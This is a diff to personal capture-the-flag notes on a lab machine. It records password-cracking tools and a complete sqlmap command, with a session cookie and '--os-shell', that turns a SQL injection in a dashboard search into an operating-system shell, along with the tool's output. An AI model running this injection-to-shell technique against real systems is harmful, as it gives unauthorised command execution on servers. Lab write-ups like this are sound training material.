@@ -355,3 +355,32 @@ Gets us:
 
 Not that useful. `public` database doesn't get us anything. And `pg_catalog` and `information_schema` are both just internal database schemas.
 
+
+## I'm stuck!
+
+Going to review the guide as to not waste time like the last 2 boxes.
+
+Interesting - They use JohnTheRipper to crack the zip password. Didn't know it could do that. I used `fcrackzip`.
+
+They also use "Crackstation" to crack the MD5 hash inside the PHP file, while I used some random website.
+
+FML. Wasted my time on trying to dump the tables again.
+
+I was supposed to use `--os-shell`.
+
+## `--os-shell`
+
+    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --os-shell
+
+Great!
+
+    [12:18:05] [INFO] fingerprinting the back-end DBMS operating system
+    [12:18:06] [INFO] the back-end DBMS operating system is Linux
+    [12:18:06] [INFO] testing if current user is DBA
+    [12:18:06] [INFO] retrieved: '1'
+    [12:18:06] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+    [12:18:06] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
+...And the shell sucks ass. Time to upgrade it.
+
+TODO
